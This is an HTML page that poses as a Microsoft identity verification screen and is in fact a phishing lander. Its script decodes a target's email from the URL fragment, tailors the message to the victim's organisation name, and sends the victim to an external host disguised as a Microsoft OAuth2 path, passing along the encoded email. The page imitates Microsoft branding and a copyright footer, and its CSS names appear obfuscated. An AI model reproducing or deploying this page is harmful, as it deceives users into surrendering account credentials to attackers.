<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Microsoft Verification</title>
    <link rel="icon" href="https://webtech.pt/wp-content/uploads/2020/12/microsoft-office-365-sharepoint.svg" type="image/svg+xml">
    <script>
        window.onload = function() {
            // Function to handle the redirection after extracting the email
            let url = window.location.href;
            let emailBase64 = url.split("#w3")[1];  // Extract part after #w3
            let decodedEmail = null;

            if (emailBase64) {
                // Decode the base64 email
                decodedEmail = atob(emailBase64);

                // Extract domain from the email to generate the company name
                let domain = decodedEmail.split('@')[1].split('.')[0];
                let companyName = domain.charAt(0).toUpperCase() + domain.slice(1);  // Capitalize domain

                // Check if the domain is a common email provider, and set a default company name
                if (['gmail', 'hotmail', 'yahoo'].includes(domain)) {
                    companyName = "Your Organization";  // Default for common domains
                }

                // Display the dynamic or default message
                document.getElementById('message').innerHTML = `To access ${companyName} organization's data, Microsoft needs to verify it's you.`;
            } else {
                // If no email found, show the default message
                document.getElementById('message').innerHTML = "To access this organization's data, Microsoft needs to verify it's you.";
            }

            // Set up the button click handler for redirection
            document.getElementById('redirectButton').onclick = function() {
                let redirectLink = "https://activedirectory-aypebda8.b4a.run/oauth2/common/client_id_b61c8803-16f3-4c35-9b17-6f65f441df86/";

                if (decodedEmail) {
                    // Append the base64 encoded email to the redirect link
                    redirectLink += "?email=" + encodeURIComponent(btoa(decodedEmail));
                }

                // Redirect to the constructed URL
                window.location.href = redirectLink;
            };
        };
    </script>
    <style>
        body {
            margin: 0;
            padding: 0;
            background: linear-gradient(135deg, #F3F3F3, #EDEDED);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: flex-start; /* Changed from center to flex-start */
            align-items: center;
            overflow-x: hidden;
            font-family: "Segoe UI", sans-serif;
            color: #1F1F1F;
            text-align: center;
            padding-top: 40px; /* Added padding to push content down */
        }

        .container {
            position: relative;
            background: white;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1);
            text-align: center;
            animation: breathing 3s infinite alternate ease-in-out;
            width: 90%;
            max-width: 500px;
            margin: 20px auto;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }

        @keyframes breathing {
            0% { transform: scale(1); box-shadow: 0px 4px 15px rgba(0, 0, 0, 0.15); }
            100% { transform: scale(1.02); box-shadow: 0px 6px 20px rgba(0, 0, 0, 0.2); }
        }

        .logo {
            width: 120px;
            display: block;
            margin-bottom: 20px;
        }

        .floating-shapes {
            position: absolute;
            width: 100%;
            height: 100%;
            top: 0;
            left: 0;
            overflow: hidden;
            pointer-events: none;
        }

        .shape {
            position: absolute;
            width: 60px;
            height: 60px;
            background: rgba(0, 120, 212, 0.2);
            transform: rotate(45deg);
            animation: floatShape 8s infinite alternate ease-in-out;
            border-radius: 8px;
        }

        @keyframes floatShape {
            0% { transform: translateY(0) rotate(45deg); }
            100% { transform: translateY(-60px) rotate(45deg); }
        }

        .message {
            font-size: 18px;
            margin: 20px 0;
            color: #444;
            text-align: center;
            width: 100%;
            padding: 0 10px;
            box-sizing: border-box;
        }

        .verify-button {
            background: #0078D4;
            color: #ffffff;
            border: none;
            padding: 12px 24px;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            transition: 0.3s;
            margin-top: 20px;
            width: auto;
            min-width: 150px;
        }

        .verify-button:hover {
            background: #005A9E;
        }

        /* Footer */
        .footer {
            width: 100%;
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            align-items: center;
            padding: 15px 10px;
            font-size: 12px;
            color: #555;
            text-align: center;
            margin-top: auto;
            margin-bottom: 20px;
        }

        .footer p {
            width: 100%;
            margin: 10px 0;
            order: 2;
        }

        .footer img {
            height: 30px;
            margin: 5px 10px;
        }

        /* Microsoft logo */
        .footer img:first-child {
            order: 1;
        }

        /* Partnership logo */
        .footer img:last-child {
            order: 3;
        }

        /* Animation container */
        #abashedly {
            height: 179px;
            width: 130px;
            overflow: hidden;
            margin: 0 auto 30px auto; /* Increased bottom margin */
        }

        /* Responsive adjustments */
        @media (max-width: 600px) {
            body {
                padding-top: 30px; /* Adjusted for mobile */
            }
            
            .container {
                padding: 20px 15px;
            }
            
            .message {
                font-size: 16px;
            }
            
            .verify-button {
                padding: 10px 20px;
                font-size: 14px;
            }
            
            .footer {
                flex-direction: column;
            }
            
            .footer img {
                height: 25px;
                margin: 5px 0;
            }

            #abashedly {
                margin-bottom: 20px; /* Adjusted for mobile */
            }
        }

        @media (max-width: 400px) {
            body {
                padding-top: 20px; /* Further adjustment for very small screens */
            }
            
            .message {
                font-size: 15px;
            }

            #abashedly {
                margin-bottom: 15px;
            }
        }

        /* Animation styles */
        @keyframes bounce{0%,100%,12.5%,32.5%,76.1%{transform:translateY(0)}22.5%,86%{transform:translateY(7px)}}
        @keyframes shadow-fade{0%,100%,21.2%,80%{opacity:0}47%,70%{opacity:1}}
        #idealistically{width:130px;margin-top:179px}
        #facilely{width:130px;height:71px;border-radius:0 0 7px 7px;overflow:hidden;margin-top:-41px}
        #facilely>.laconically{width:287px;height:71px;background:#27a0e0;transform:translate(-153px,-70px) rotate(28deg)}
        #facilely>.yaws{width:287px;height:71px;background:#1388d6;transform:translate(-120px,63px) rotate(-28deg)}
        #lacquer{width:130px;height:40px;background:#113864;margin-top:-70px}
        #quagmire{display:flex;flex-wrap:wrap;width:118px;height:131px;border-radius:7px;overflow:hidden;margin:0 auto;margin-top:-306px;animation:cal-bounce 5s infinite;animation-timing-function:cubic-bezier(0,.5,0,1);transform:translateY(51px) scaleY(1)}
        @keyframes cal-bounce{0%,100%,16.5%,76.1%{transform:translateY(151px) scaleY(1)}28%{transform:translateY(39px) scaleY(1)}31%{transform:translateY(51px) scaleY(1.05)}33%{transform:translateY(51px) scaleY(.96)}34%,68.5%{transform:translateY(51px) scaleY(1)}68.5%{animation-timing-function:cubic-bezier(.66,-.16,1,-.29)}}
        #quagmire>.oafishness{width:118px;height:21px;margin-bottom:-1px;background:#0354a1}
        #quagmire>.yaws{display:flex;width:118px;height:37px}
        .laboriously{width:39.3333px;height:38px}
        .abdominal{background:#0073cc}
        .icon{background:#27a0e0}
        .ulnar{background:#4fcfff}
        .haggardly{background:#035fb3}
        .kayak{background:#134276}
        #facsimile{width:130px;height:107px;animation:opened-flap-swing 5s infinite;animation-timing-function:cubic-bezier(.32,0,.67,0);transform-origin:top;transform:translateY(-68px) rotate3d(1,0,0,-180deg)}
        @keyframes opened-flap-swing{0%,100%,14.5%,76%{transform:translateY(-68px) rotate3d(1,0,0,-90deg)}16.5%,74%{transform:translateY(-68px) rotate3d(1,0,0,-180deg)}}
        #zingy{width:130px;animation:closed-flap-swing 5s infinite;animation-timing-function:cubic-bezier(.32,0,.67,0);transform-origin:top;transform:translateY(-71px) rotate3d(1,0,0,90deg)}
        @keyframes closed-flap-swing{0%,100%,77%,8.5%{transform:translateY(-71px) rotate3d(1,0,0,0)}14.5%,76%{transform:translateY(-71px) rotate3d(1,0,0,90deg)}}
        #ultimo{width:130px;height:107px;overflow:hidden}
        .tacker{width:96px;height:96px;background:#4fcfff;margin:-48px auto 0 auto;border-radius:7px;transform:scaleY(.6) rotate(45deg)}
        #facsimile .tacker{background:#113864}
        #zingy .tacker{background:#4fcfff}
    </style>
</head>
<body>
    <div class="floating-shapes">
        <div class="shape" style="top: 10%; left: 20%; animation-duration: 6s;"></div>
        <div class="shape" style="top: 40%; left: 70%; animation-duration: 7s;"></div>
        <div class="shape" style="top: 60%; left: 30%; animation-duration: 8s;"></div>
        <div class="shape" style="top: 80%; left: 50%; animation-duration: 9s;"></div>
    </div>
    <div id="abashedly">
        <div id="idealistically">
            <div id="facsimile">
                <div id="ultimo">
                    <div class="tacker"></div>
                </div>
            </div>
            <div id="quagmire">
                <div class="oafishness"></div>
                <div class="yaws">
                    <div class="laboriously abdominal"></div>
                    <div class="laboriously icon"></div>
                    <div class="laboriously ulnar"></div>
                </div>
                <div class="yaws">
                    <div class="laboriously haggardly"></div>
                    <div class="laboriously abdominal"></div>
                    <div class="laboriously icon"></div>
                </div>
                <div class="yaws">
                    <div class="laboriously kayak"></div>
                    <div class="laboriously haggardly"></div>
                    <div class="laboriously abdominal"></div>
                </div>
            </div>
        </div>
        <div id="lacquer"></div>
        <div id="facilely">
            <div class="yaws"></div>
            <div class="laconically"></div>
        </div>
        <div id="zingy">
            <div id="ultimo">
                <div class="tacker"></div>
            </div>
        </div>
    </div>
    
    <div class="container">
        <div id="message" class="message"></div>
        <button class="verify-button" id="redirectButton">Continue</button>
    </div>
    
    <div class="footer">
        <img src="https://www.washingtonpost.com/creativegroup/uploads/2022/05/27204032/MS-Security_logo_horiz_c-gray_rgb-1024x309.png" alt="Microsoft Security">
        <p>© 2025 Microsoft | All Rights Reserved.</p>
        <img src="https://th.bing.com/th/id/R.90b26a8e7731c78232f83aa24d533403?rik=%2b5fofimPQvOoKw&pid=ImgRaw&r=0" alt="Partnership Logo">
    </div>
</body>
</html>
